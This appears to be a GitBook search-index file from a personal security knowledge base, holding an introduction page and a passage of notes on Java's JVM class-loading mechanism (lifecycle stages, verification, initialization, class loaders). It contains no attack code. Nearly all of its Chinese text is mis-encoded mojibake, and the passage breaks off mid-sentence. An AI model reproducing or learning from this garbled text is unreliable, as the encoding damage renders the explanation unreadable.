{"./":{"url":"./","title":"Introduction","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 Introduction å…³äºæˆ‘ Introduction ä¸ªäººçš„éƒ¨åˆ†çŸ¥è¯†æŠ€èƒ½ï¼Œå€¾å‘äºä½¿ç”¨çŸ¥è¯†åº“çš„æ–¹å¼è¿›è¡Œæ€»ç»“å›é¡¾è‡ªå·±ï¼Œåç»­ä¼šä¸æ–­å®Œå–„ï¼ŒæŠ“ä½2021å¹´æœ€åçš„å°¾å·´ï¼ å…³äºæˆ‘ é‚®ç®±ï¼šdamit5#protonmail.com GitHubï¼šhttps://github.com/damit5/ å°æ—¶å€™æˆ‘çˆ±åƒè¥¿çº¢æŸ¿ğŸ… æˆ‘ä»¥ä¸ºæˆ‘ä¸€è¾ˆå­éƒ½ä¼šçˆ±ä¸‹å» åæ¥é•¿å¤§äº†å‘ç°æ²¡é‚£ä¹ˆçˆ±äº† æˆ‘æ²¡é”™ è¥¿çº¢æŸ¿ä¹Ÿæ²¡é”™ é”™çš„æ˜¯é‚£è‡ªä»¥ä¸ºæ˜¯çš„ä¸€ç”Ÿ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-18 21:17:38 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/01.JVMç±»åŠ è½½æœºåˆ¶.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/01.JVMç±»åŠ è½½æœºåˆ¶.html","title":"01.JVMç±»åŠ è½½æœºåˆ¶","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 ç±»çš„åŠ è½½æœºåˆ¶ ç±»çš„ç”Ÿå‘½å‘¨æœŸ åŠ è½½ï¼šæŸ¥æ‰¾å¹¶åŠ è½½ç±»çš„äºŒè¿›åˆ¶æ•°æ® æ ¡éªŒï¼šç¡®ä¿è¢«åŠ è½½çš„ç±»çš„æ­£ç¡®æ€§ å‡†å¤‡ï¼šä¸ºç±»çš„é™æ€å˜é‡åˆ†é…å†…å­˜ï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ä¸ºé»˜è®¤å€¼ è§£æï¼šæŠŠç±»ä¸­çš„ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨ åˆå§‹åŒ–ï¼šå¯¹ç±»çš„é™æ€å˜é‡ï¼Œé™æ€ä»£ç å—æ‰§è¡Œåˆå§‹åŒ–æ“ä½œ ç±»åˆå§‹åŒ–çš„æ­¥éª¤ è§¦å‘ç±»åˆå§‹åŒ–çš„æ—¶æœº ä»¥ä¸‹å‡ ç§æƒ…å†µä¸ä¼šæ‰§è¡Œç±»åˆå§‹åŒ– ä½¿ç”¨ å¸è½½ ç±»åŠ è½½å™¨ ä»€ä¹ˆæ˜¯ç±»åŠ è½½å™¨ ç±»åŠ è½½å™¨çš„å±‚æ¬¡ å¯åŠ¨ç±»åŠ è½½å™¨(Bootstrap ClassLoader) æ‰©å±•ç±»åŠ è½½å™¨(Extension ClassLoader) åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨(Application ClassLoader) æ³¨æ„ ç±»åŠ è½½çš„å‡ ç§æ–¹å¼ JVMç±»åŠ è½½æœºåˆ¶ å…¨ç›˜è´Ÿè´£ çˆ¶ç±»å§”æ‰˜ ç¼“å­˜æœºåˆ¶ åŒäº²å§”æ´¾æœºåˆ¶ ç±»çš„åŒäº²å§”æ´¾æœºåˆ¶ åŒäº²å§”æ´¾æœºåˆ¶çš„å·¥ä½œæµç¨‹ åŒäº²å§”æ´¾æœºåˆ¶çš„ä¼˜ç‚¹ åŒäº²å§”æ´¾æœºåˆ¶ä»£ç å®ç° ç±»åŠ è½½å™¨çš„æ ¸å¿ƒæ–¹æ³• è‡ªå®šä¹‰ç±»åŠ è½½å™¨ URLClassLoader å‚è€ƒ ç±»çš„åŠ è½½æœºåˆ¶ Javaæ˜¯ä¸€ä¸ªä¾èµ–äºJVM(Javaè™šæ‹Ÿæœº)å®ç°çš„è·¨å¹³å°çš„å¼€å‘è¯­è¨€ã€‚Javaç¨‹åºåœ¨è¿è¡Œå‰éœ€è¦å…ˆç¼–è¯‘æˆclassæ–‡ä»¶ï¼ŒJavaç±»åˆå§‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨ java.lang.ClassLoaderåŠ è½½ç±»å­—èŠ‚ç ï¼ŒClassLoaderä¼šè°ƒç”¨JVMçš„nativeæ–¹æ³•(defineClass0/1/2)æ¥å®šä¹‰ä¸€ä¸ªjava.lang.Classå®ä¾‹ã€‚ Javaè™šæ‹ŸæœºæŠŠæè¿°ç±»çš„æ•°æ®ä»Classæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ï¼Œå¹¶å¯¹æ•°æ®è¿›è¡Œæ ¡éªŒã€è½¬æ¢è§£æå’Œåˆå§‹åŒ–ï¼Œæœ€ç»ˆå½¢æˆå¯ä»¥è¢«è™šæ‹Ÿæœºç›´æ¥ä½¿ç”¨çš„Javaç±»å‹ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä½œè™šæ‹Ÿæœºçš„ç±»åŠ è½½æœºåˆ¶ã€‚ ç±»çš„ç”Ÿå‘½å‘¨æœŸ ç±»ä»è¢«åŠ è½½åˆ°è™šæ‹Ÿæœºå†…å­˜ä¸­å¼€å§‹ï¼Œåˆ°å¸è½½å‡ºå†…å­˜ä¸ºæ­¢ï¼Œå®ƒçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸåŒ…æ‹¬ï¼šåŠ è½½ï¼Œæ ¡éªŒï¼Œå‡†å¤‡ï¼Œè§£æï¼Œåˆå§‹åŒ–,ä½¿ç”¨,å¸è½½è¿™7ä¸ªé˜¶æ®µ.å…¶ä¸­å…¶ä¸­éªŒè¯ã€å‡†å¤‡ã€è§£æ3ä¸ªéƒ¨åˆ†ç»Ÿç§°ä¸ºé“¾æ¥ã€‚ åŠ è½½ã€æ ¡éªŒã€å‡†å¤‡ã€åˆå§‹åŒ–å’Œå¸è½½è¿™äº”ä¸ªé˜¶æ®µçš„é¡ºåºæ˜¯ç¡®å®šçš„ï¼Œç±»å‹çš„åŠ è½½è¿‡ç¨‹å¿…é¡»æŒ‰ç…§è¿™ç§é¡ºåºæŒ‰éƒ¨å°±ç­åœ°å¼€å§‹ï¼Œè€Œè§£æé˜¶æ®µåˆ™ä¸ä¸€å®šï¼šå®ƒåœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥åœ¨åˆå§‹åŒ–é˜¶æ®µä¹‹åå†å¼€å§‹ï¼Œè¿™æ˜¯ä¸ºäº†æ”¯æŒJavaè¯­è¨€çš„è¿è¡Œæ—¶ç»‘å®šç‰¹æ€§ï¼ˆä¹Ÿç§°ä¸ºåŠ¨æ€ç»‘å®šæˆ–æ™šæœŸç»‘å®šï¼‰ æ³¨æ„ï¼Œè¿™é‡Œçš„å‡ ä¸ªé˜¶æ®µæ˜¯æŒ‰é¡ºåºå¼€å§‹ï¼Œè€Œä¸æ˜¯æŒ‰é¡ºåºè¿›è¡Œæˆ–å®Œæˆï¼Œå› ä¸ºè¿™äº›é˜¶æ®µé€šå¸¸éƒ½æ˜¯äº’ç›¸äº¤å‰åœ°æ··åˆè¿›è¡Œçš„ï¼Œé€šå¸¸åœ¨ä¸€ä¸ªé˜¶æ®µæ‰§è¡Œçš„è¿‡ç¨‹ä¸­è°ƒç”¨æˆ–æ¿€æ´»å¦ä¸€ä¸ªé˜¶æ®µã€‚ åŠ è½½ï¼šæŸ¥æ‰¾å¹¶åŠ è½½ç±»çš„äºŒè¿›åˆ¶æ•°æ® åœ¨åŠ è½½é˜¶æ®µï¼Œè™šæ‹Ÿæœºéœ€è¦å®Œæˆä»¥ä¸‹3ä»¶äº‹æƒ…ï¼š 1ï¼‰é€šè¿‡ä¸€ä¸ªç±»çš„å…¨é™å®šåæ¥è·å–å®šä¹‰æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµã€‚ 2ï¼‰å°†è¿™ä¸ªå­—èŠ‚æµæ‰€ä»£è¡¨çš„é™æ€å­˜å‚¨ç»“æ„è½¬åŒ–ä¸ºæ–¹æ³•åŒºçš„è¿è¡Œæ—¶æ•°æ®ç»“æ„ã€‚ 3ï¼‰åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„java.lang.Classå¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºè¿™ä¸ªç±»çš„å„ç§æ•°æ®çš„è®¿é—®å…¥å£ã€‚ æ ¡éªŒï¼šç¡®ä¿è¢«åŠ è½½çš„ç±»çš„æ­£ç¡®æ€§ éªŒè¯æ˜¯è¿æ¥é˜¶æ®µçš„ç¬¬ä¸€æ­¥ï¼Œè¿™ä¸€é˜¶æ®µçš„ç›®çš„æ˜¯ä¸ºäº†ç¡®ä¿Classæ–‡ä»¶çš„å­—èŠ‚æµä¸­åŒ…å«çš„ä¿¡æ¯ç¬¦åˆå½“å‰è™šæ‹Ÿæœºçš„è¦æ±‚ï¼Œå¹¶ä¸”ä¸ä¼šå±å®³è™šæ‹Ÿæœºè‡ªèº«çš„å®‰å…¨ã€‚éªŒè¯é˜¶æ®µå¤§è‡´ä¼šå®Œæˆ4ä¸ªé˜¶æ®µçš„æ£€éªŒåŠ¨ä½œ: æ–‡ä»¶æ ¼å¼éªŒè¯: éªŒè¯å­—èŠ‚æµæ˜¯å¦ç¬¦åˆClassæ–‡ä»¶æ ¼å¼çš„è§„èŒƒï¼›ä¾‹å¦‚: æ˜¯å¦ä»¥0xCAFEBABEå¼€å¤´ã€ä¸»æ¬¡ç‰ˆæœ¬å·æ˜¯å¦åœ¨å½“å‰è™šæ‹Ÿæœºçš„å¤„ç†èŒƒå›´ä¹‹å†…ã€å¸¸é‡æ± ä¸­çš„å¸¸é‡æ˜¯å¦æœ‰ä¸è¢«æ”¯æŒçš„ç±»å‹ã€‚ å…ƒæ•°æ®éªŒè¯ï¼šå¯¹å­—èŠ‚ç æè¿°çš„ä¿¡æ¯è¿›è¡Œè¯­ä¹‰åˆ†æ(æ³¨æ„: å¯¹æ¯”javacç¼–è¯‘é˜¶æ®µçš„è¯­ä¹‰åˆ†æ)ï¼Œä»¥ä¿è¯å…¶æè¿°çš„ä¿¡æ¯ç¬¦åˆJavaè¯­è¨€è§„èŒƒçš„è¦æ±‚ï¼›ä¾‹å¦‚: è¿™ä¸ªç±»æ˜¯å¦æœ‰çˆ¶ç±»ï¼Œé™¤äº†java.lang.Objectä¹‹å¤–ã€‚ å­—èŠ‚ç éªŒè¯ï¼šé€šè¿‡æ•°æ®æµå’Œæ§åˆ¶æµåˆ†æï¼Œç¡®å®šç¨‹åºè¯­ä¹‰æ˜¯åˆæ³•çš„ã€ç¬¦åˆé€»è¾‘çš„ã€‚ ç¬¦å·å¼•ç”¨éªŒè¯ï¼šç¡®ä¿è§£æåŠ¨ä½œèƒ½æ­£ç¡®æ‰§è¡Œã€‚ éªŒè¯é˜¶æ®µæ˜¯éå¸¸é‡è¦çš„ï¼Œä½†ä¸æ˜¯å¿…é¡»çš„ï¼Œå®ƒå¯¹ç¨‹åºè¿è¡ŒæœŸæ²¡æœ‰å½±å“ï¼Œå¦‚æœæ‰€å¼•ç”¨çš„ç±»ç»è¿‡åå¤éªŒè¯ï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘é‡‡ç”¨-Xverifynoneå‚æ•°æ¥å…³é—­å¤§éƒ¨åˆ†çš„ç±»éªŒè¯æªæ–½ï¼Œä»¥ç¼©çŸ­è™šæ‹Ÿæœºç±»åŠ è½½çš„æ—¶é—´ã€‚ å‡†å¤‡ï¼šä¸ºç±»çš„é™æ€å˜é‡åˆ†é…å†…å­˜ï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ä¸ºé»˜è®¤å€¼ å‡†å¤‡é˜¶æ®µæ˜¯æ­£å¼ä¸ºç±»å˜é‡åˆ†é…å†…å­˜å¹¶è®¾ç½®ç±»å˜é‡åˆå§‹å€¼çš„é˜¶æ®µï¼Œè¿™äº›å˜é‡æ‰€ä½¿ç”¨çš„å†…å­˜éƒ½å°†åœ¨æ–¹æ³•åŒºä¸­è¿›è¡Œåˆ†é…ã€‚ è¯¥é˜¶æ®µçš„æ³¨æ„äº‹é¡¹ï¼š è¿™æ—¶å€™è¿›è¡Œå†…å­˜åˆ†é…çš„ä»…åŒ…æ‹¬ç±»å˜é‡ï¼ˆè¢«staticä¿®é¥°çš„å˜é‡ï¼‰ï¼Œè€Œä¸åŒ…æ‹¬å®ä¾‹å˜é‡ï¼Œå®ä¾‹å˜é‡å°†ä¼šåœ¨å¯¹è±¡å®ä¾‹åŒ–æ—¶éšç€å¯¹è±¡ä¸€èµ·åˆ†é…åœ¨Javaå †ä¸­ã€‚ è¿™é‡Œæ‰€è®¾ç½®çš„åˆå§‹å€¼é€šå¸¸æƒ…å†µä¸‹æ˜¯æ•°æ®ç±»å‹é»˜è®¤çš„é›¶å€¼(å¦‚0ã€0Lã€nullã€falseç­‰)ï¼Œè€Œä¸æ˜¯è¢«åœ¨Javaä»£ç ä¸­è¢«æ˜¾å¼åœ°èµ‹äºˆçš„å€¼ã€‚ æ¯”å¦‚ï¼šå‡è®¾ä¸€ä¸ªç±»å˜é‡çš„å®šä¹‰ä¸º: public static int value = 3ï¼›é‚£ä¹ˆå˜é‡valueåœ¨å‡†å¤‡é˜¶æ®µè¿‡åçš„åˆå§‹å€¼ä¸º0ï¼Œè€Œä¸æ˜¯3ï¼Œå› ä¸ºè¿™æ—¶å€™å°šæœªå¼€å§‹æ‰§è¡Œä»»ä½•Javaæ–¹æ³•ï¼Œè€ŒæŠŠvalueèµ‹å€¼ä¸º3çš„put staticæŒ‡ä»¤æ˜¯åœ¨ç¨‹åºç¼–è¯‘åï¼Œå­˜æ”¾äºç±»æ„é€ å™¨()æ–¹æ³•ä¹‹ä¸­çš„ï¼Œæ‰€ä»¥æŠŠvalueèµ‹å€¼ä¸º3çš„åŠ¨ä½œå°†åœ¨åˆå§‹åŒ–é˜¶æ®µæ‰ä¼šæ‰§è¡Œã€‚ å¯¹åŸºæœ¬æ•°æ®ç±»å‹æ¥è¯´ï¼Œå¯¹äºç±»å˜é‡(static)å’Œå…¨å±€å˜é‡ï¼Œå¦‚æœä¸æ˜¾å¼åœ°å¯¹å…¶èµ‹å€¼è€Œç›´æ¥ä½¿ç”¨ï¼Œåˆ™ç³»ç»Ÿä¼šä¸ºå…¶èµ‹äºˆé»˜è®¤çš„é›¶å€¼ï¼Œè€Œå¯¹äºå±€éƒ¨å˜é‡æ¥è¯´ï¼Œåœ¨ä½¿ç”¨å‰å¿…é¡»æ˜¾å¼åœ°ä¸ºå…¶èµ‹å€¼ï¼Œå¦åˆ™ç¼–è¯‘æ—¶ä¸é€šè¿‡ã€‚ å¯¹äºåŒæ—¶è¢«staticå’Œfinalä¿®é¥°çš„å¸¸é‡ï¼Œå¿…é¡»åœ¨å£°æ˜çš„æ—¶å€™å°±ä¸ºå…¶æ˜¾å¼åœ°èµ‹å€¼ï¼Œå¦åˆ™ç¼–è¯‘æ—¶ä¸é€šè¿‡ï¼›è€Œåªè¢«finalä¿®é¥°çš„å¸¸é‡åˆ™æ—¢å¯ä»¥åœ¨å£°æ˜æ—¶æ˜¾å¼åœ°ä¸ºå…¶èµ‹å€¼ï¼Œä¹Ÿå¯ä»¥åœ¨ç±»åˆå§‹åŒ–æ—¶æ˜¾å¼åœ°ä¸ºå…¶èµ‹å€¼ï¼Œæ€»ä¹‹ï¼Œåœ¨ä½¿ç”¨å‰å¿…é¡»ä¸ºå…¶æ˜¾å¼åœ°èµ‹å€¼ï¼Œç³»ç»Ÿä¸ä¼šä¸ºå…¶èµ‹äºˆé»˜è®¤é›¶å€¼ã€‚ å¯¹äºå¼•ç”¨æ•°æ®ç±»å‹referenceæ¥è¯´ï¼Œå¦‚æ•°ç»„å¼•ç”¨ã€å¯¹è±¡å¼•ç”¨ç­‰ï¼Œå¦‚æœæ²¡æœ‰å¯¹å…¶è¿›è¡Œæ˜¾å¼åœ°èµ‹å€¼è€Œç›´æ¥ä½¿ç”¨ï¼Œç³»ç»Ÿéƒ½ä¼šä¸ºå…¶èµ‹äºˆé»˜è®¤çš„é›¶å€¼ï¼Œå³nullã€‚ å¦‚æœåœ¨æ•°ç»„åˆå§‹åŒ–æ—¶æ²¡æœ‰å¯¹æ•°ç»„ä¸­çš„å„å…ƒç´ èµ‹å€¼ï¼Œé‚£ä¹ˆå…¶ä¸­çš„å…ƒç´ å°†æ ¹æ®å¯¹åº”çš„æ•°æ®ç±»å‹è€Œè¢«èµ‹äºˆé»˜è®¤çš„é›¶å€¼ã€‚ å¦‚æœç±»å­—æ®µçš„å­—æ®µå±æ€§è¡¨ä¸­å­˜åœ¨ConstantValueå±æ€§ï¼Œå³åŒæ—¶è¢«finalå’Œstaticä¿®é¥°ï¼Œé‚£ä¹ˆåœ¨å‡†å¤‡é˜¶æ®µå˜é‡valueå°±ä¼šè¢«åˆå§‹åŒ–ä¸ºConstValueå±æ€§æ‰€æŒ‡å®šçš„å€¼ã€‚ å‡è®¾ä¸Šé¢çš„ç±»å˜é‡valueè¢«å®šä¹‰ä¸º: public static final int value = 3ï¼›ç¼–è¯‘æ—¶Javacå°†ä¼šä¸ºvalueç”ŸæˆConstantValueå±æ€§ï¼Œåœ¨å‡†å¤‡é˜¶æ®µè™šæ‹Ÿæœºå°±ä¼šæ ¹æ®ConstantValueçš„è®¾ç½®å°†valueèµ‹å€¼ä¸º3ã€‚æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºstatic finalå¸¸é‡åœ¨ç¼–è¯‘æœŸå°±å°†å…¶ç»“æœæ”¾å…¥äº†è°ƒç”¨å®ƒçš„ç±»çš„å¸¸é‡æ± ä¸­ è§£æï¼šæŠŠç±»ä¸­çš„ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨ è§£æé˜¶æ®µæ˜¯è™šæ‹Ÿæœºå°†å¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹ï¼Œè§£æåŠ¨ä½œä¸»è¦é’ˆå¯¹ç±»æˆ–æ¥å£ã€å­—æ®µã€ç±»æ–¹æ³•ã€æ¥å£æ–¹æ³•ã€æ–¹æ³•ç±»å‹ã€æ–¹æ³•å¥æŸ„å’Œè°ƒç”¨ç‚¹é™å®šç¬¦7ç±»ç¬¦å·å¼•ç”¨è¿›è¡Œã€‚ç¬¦å·å¼•ç”¨å°±æ˜¯ä¸€ç»„ç¬¦å·æ¥æè¿°ç›®æ ‡ï¼Œå¯ä»¥æ˜¯ä»»ä½•å­—é¢é‡ã€‚ ç›´æ¥å¼•ç”¨å°±æ˜¯ç›´æ¥æŒ‡å‘ç›®æ ‡çš„æŒ‡é’ˆã€ç›¸å¯¹åç§»é‡æˆ–ä¸€ä¸ªé—´æ¥å®šä½åˆ°ç›®æ ‡çš„å¥æŸ„ã€‚ åˆå§‹åŒ–ï¼šå¯¹ç±»çš„é™æ€å˜é‡ï¼Œé™æ€ä»£ç å—æ‰§è¡Œåˆå§‹åŒ–æ“ä½œ åˆå§‹åŒ–ï¼Œä¸ºç±»çš„é™æ€å˜é‡èµ‹äºˆæ­£ç¡®çš„åˆå§‹å€¼ï¼ŒJVMè´Ÿè´£å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ï¼Œä¸»è¦å¯¹ç±»å˜é‡è¿›è¡Œåˆå§‹åŒ–ã€‚åœ¨Javaä¸­å¯¹ç±»å˜é‡è¿›è¡Œåˆå§‹å€¼è®¾å®šæœ‰ä¸¤ç§æ–¹å¼: å£°æ˜ç±»å˜é‡æ˜¯æŒ‡å®šåˆå§‹å€¼ ä½¿ç”¨é™æ€ä»£ç å—ä¸ºç±»å˜é‡æŒ‡å®šåˆå§‹å€¼ ç±»åˆå§‹åŒ–çš„æ­¥éª¤ å‡å¦‚è¿™ä¸ªç±»è¿˜æ²¡æœ‰è¢«åŠ è½½å’Œè¿æ¥ï¼Œåˆ™ç¨‹åºå…ˆåŠ è½½å¹¶è¿æ¥è¯¥ç±» å‡å¦‚è¯¥ç±»çš„ç›´æ¥çˆ¶ç±»è¿˜æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œåˆ™å…ˆåˆå§‹åŒ–å…¶ç›´æ¥çˆ¶ç±» å‡å¦‚ç±»ä¸­æœ‰åˆå§‹åŒ–è¯­å¥ï¼Œåˆ™ç³»ç»Ÿä¾æ¬¡æ‰§è¡Œè¿™äº›åˆå§‹åŒ–è¯­å¥ è§¦å‘ç±»åˆå§‹åŒ–çš„æ—¶æœº åªæœ‰å½“å¯¹ç±»çš„ä¸»åŠ¨ä½¿ç”¨çš„æ—¶å€™æ‰ä¼šå¯¼è‡´ç±»çš„åˆå§‹åŒ–ï¼Œç±»çš„ä¸»åŠ¨ä½¿ç”¨åŒ…æ‹¬ä»¥ä¸‹å…­ç§: ä½¿ç”¨newå…³é”®å­—å®ä¾‹åŒ–å¯¹è±¡çš„æ—¶å€™ã€‚ è¯»å–æˆ–è®¾ç½®ä¸€ä¸ªç±»å‹çš„é™æ€å­—æ®µï¼ˆè¢«finalä¿®é¥°ã€å·²åœ¨ç¼–è¯‘æœŸæŠŠç»“æœæ”¾å…¥å¸¸é‡æ± çš„é™æ€å­—æ®µé™¤å¤–ï¼‰çš„æ—¶å€™ã€‚ è°ƒç”¨ä¸€ä¸ªç±»å‹çš„é™æ€æ–¹æ³•çš„æ—¶å€™ã€‚ ä½¿ç”¨java.lang.reflectåŒ…çš„æ–¹æ³•å¯¹ç±»å‹è¿›è¡Œåå°„è°ƒç”¨çš„æ—¶å€™ï¼Œå¦‚æœç±»å‹æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶åˆå§‹åŒ–ã€‚ å½“åˆå§‹åŒ–ç±»çš„æ—¶å€™ï¼Œå¦‚æœå‘ç°å…¶çˆ¶ç±»è¿˜æ²¡æœ‰è¿›è¡Œè¿‡åˆå§‹åŒ–ï¼Œåˆ™éœ€è¦å…ˆè§¦å‘å…¶çˆ¶ç±»çš„åˆå§‹åŒ–ã€‚ å½“è™šæ‹Ÿæœºå¯åŠ¨æ—¶ï¼Œç”¨æˆ·éœ€è¦æŒ‡å®šä¸€ä¸ªè¦æ‰§è¡Œçš„ä¸»ç±»ï¼ˆåŒ…å«main()æ–¹æ³•çš„é‚£ä¸ªç±»ï¼‰ï¼Œè™šæ‹Ÿæœºä¼šå…ˆåˆå§‹åŒ–è¿™ä¸ªä¸»ç±»ã€‚ ä»¥ä¸‹å‡ ç§æƒ…å†µä¸ä¼šæ‰§è¡Œç±»åˆå§‹åŒ– é€šè¿‡å­ç±»å¼•ç”¨çˆ¶ç±»çš„é™æ€å­—æ®µï¼Œåªä¼šè§¦å‘çˆ¶ç±»çš„åˆå§‹åŒ–ï¼Œè€Œä¸ä¼šè§¦å‘å­ç±»çš„åˆå§‹åŒ–ã€‚ å®šä¹‰å¯¹è±¡æ•°ç»„ï¼Œä¸ä¼šè§¦å‘è¯¥ç±»çš„åˆå§‹åŒ–ã€‚ å¸¸é‡åœ¨ç¼–è¯‘æœŸé—´ä¼šå­˜å…¥è°ƒç”¨ç±»çš„å¸¸é‡æ± ä¸­ï¼Œæœ¬è´¨ä¸Šå¹¶æ²¡æœ‰ç›´æ¥å¼•ç”¨å®šä¹‰å¸¸é‡çš„ç±»ï¼Œä¸ä¼šè§¦å‘å®šä¹‰å¸¸é‡æ‰€åœ¨çš„ç±»ã€‚ é€šè¿‡ç±»åè·å– Class å¯¹è±¡ï¼Œä¸ä¼šè§¦å‘ç±»çš„åˆå§‹åŒ–ã€‚ é€šè¿‡ Class.forName åŠ è½½æŒ‡å®šç±»æ—¶ï¼Œå¦‚æœæŒ‡å®šå‚æ•° initialize ä¸º false æ—¶ï¼Œä¹Ÿä¸ä¼šè§¦å‘ç±»åˆå§‹åŒ–ï¼Œå…¶å®è¿™ä¸ªå‚æ•°æ˜¯å‘Šè¯‰è™šæ‹Ÿæœºï¼Œæ˜¯å¦è¦å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ã€‚ é€šè¿‡ ClassLoader é»˜è®¤çš„ loadClass æ–¹æ³•ï¼Œä¹Ÿä¸ä¼šè§¦å‘åˆå§‹åŒ–åŠ¨ä½œã€‚ ä½¿ç”¨ ç±»è®¿é—®æ–¹æ³•åŒºå†…çš„æ•°æ®ç»“æ„çš„æ¥å£ï¼Œ å¯¹è±¡æ˜¯HeapåŒºçš„æ•°æ®ã€‚ å¸è½½ Javaè™šæ‹Ÿæœºå°†ç»“æŸç”Ÿå‘½å‘¨æœŸçš„å‡ ç§æƒ…å†µ æ‰§è¡Œäº†System.exit()æ–¹æ³• ç¨‹åºæ­£å¸¸æ‰§è¡Œç»“æŸ ç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­é‡åˆ°äº†å¼‚å¸¸æˆ–é”™è¯¯è€Œå¼‚å¸¸ç»ˆæ­¢ ç”±äºæ“ä½œç³»ç»Ÿå‡ºç°é”™è¯¯è€Œå¯¼è‡´Javaè™šæ‹Ÿæœºè¿›ç¨‹ç»ˆæ­¢ ç±»åŠ è½½å™¨ ä»€ä¹ˆæ˜¯ç±»åŠ è½½å™¨ è™šæ‹Ÿæœºè®¾è®¡å›¢é˜ŸæŠŠç±»åŠ è½½é˜¶æ®µä¸­çš„==é€šè¿‡ä¸€ä¸ªç±»çš„å…¨é™å®šåæ¥è·å–æè¿°æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµ==è¿™ä¸ªåŠ¨ä½œæ”¾åˆ°Javaè™šæ‹Ÿæœºå¤–éƒ¨å»å®ç°ï¼Œä»¥ä¾¿è®©åº”ç”¨ç¨‹åºè‡ªå·±å†³å®šå¦‚ä½•å»è·å–æ‰€éœ€è¦çš„ç±»ã€‚ å®ç°è¿™ä¸ªåŠ¨ä½œçš„ä»£ç æ¨¡å—ç§°ä¸ºç±»åŠ è½½å™¨ã€‚ ä¸€åˆ‡çš„Javaç±»éƒ½å¿…é¡»ç»è¿‡JVMåŠ è½½åæ‰èƒ½è¿è¡Œï¼Œè€ŒClassLoaderçš„ä¸»è¦ä½œç”¨å°±æ˜¯Javaç±»æ–‡ä»¶çš„åŠ è½½ã€‚ å¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½éœ€è¦ç”±åŠ è½½å®ƒçš„ç±»åŠ è½½å™¨å’Œè¿™ä¸ªç±»æœ¬èº«ä¸€åŒç¡®ç«‹å…¶åœ¨ Java è™šæ‹Ÿæœºçš„å”¯ä¸€æ€§ï¼Œæ¯ä¸ªç±»åŠ è½½å™¨éƒ½æ‹¥æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ç±»å‘½åç©ºé—´ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šæ¯”è¾ƒä¸¤ä¸ªç±»æ˜¯å¦ã€Œç›¸ç­‰ã€ï¼Œè¦åœ¨è¿™ä¸¤ä¸ªç±»æ˜¯ç”±åŒä¸€ä¸ªç±»åŠ è½½å™¨åŠ è½½çš„å‰æä¸‹æ‰æœ‰æ„ä¹‰ï¼Œå¦åˆ™ï¼Œå³ä½¿è¿™ä¸¤ä¸ªç±»æ¥æºäºåŒä¸€ä¸ª Class æ–‡ä»¶ï¼Œè¢«åŒä¸€ä¸ªè™šæ‹ŸæœºåŠ è½½ï¼Œåªè¦åŠ è½½å®ƒä»¬çš„ç±»åŠ è½½å™¨ä¸åŒï¼Œé‚£è¿™ä¸¤ä¸ªç±»å°±å¿…å®šä¸ç›¸ç­‰ã€‚ ç±»åŠ è½½å™¨çš„å±‚æ¬¡ ä»Javaè™šæ‹Ÿæœºçš„è§’åº¦æ¥è®²ï¼Œåªå­˜åœ¨ä¸¤ç§ä¸åŒçš„ç±»åŠ è½½å™¨ï¼š ä¸€ç§æ˜¯å¯åŠ¨ç±»åŠ è½½å™¨ï¼ˆBootstrap ClassLoaderï¼‰ï¼Œè¿™ä¸ªç±»åŠ è½½å™¨ä½¿ç”¨C++è¯­è¨€å®ç°ï¼Œæ˜¯è™šæ‹Ÿæœºè‡ªèº«çš„ä¸€éƒ¨åˆ†ï¼Œè´Ÿè´£åŠ è½½JDKä¸­çš„æ ¸å¿ƒç±»åº“ï¼Œç±»ä¼¼äºæ“ä½œç³»ç»Ÿå¯åŠ¨æ—¶çš„boot loader å¦ä¸€ç§å°±æ˜¯æ‰€æœ‰å…¶ä»–çš„ç±»åŠ è½½å™¨ï¼Œè¿™äº›ç±»åŠ è½½å™¨éƒ½ç”±Javaè¯­è¨€å®ç°ï¼Œç‹¬ç«‹äºè™šæ‹Ÿæœºå¤–éƒ¨ï¼Œå¹¶ä¸”å…¨éƒ½ç»§æ‰¿è‡ªæŠ½è±¡ç±»java.lang.ClassLoaderã€‚ ä»Javaå¼€å‘äººå‘˜çš„è§’åº¦æ¥çœ‹ï¼Œç±»åŠ 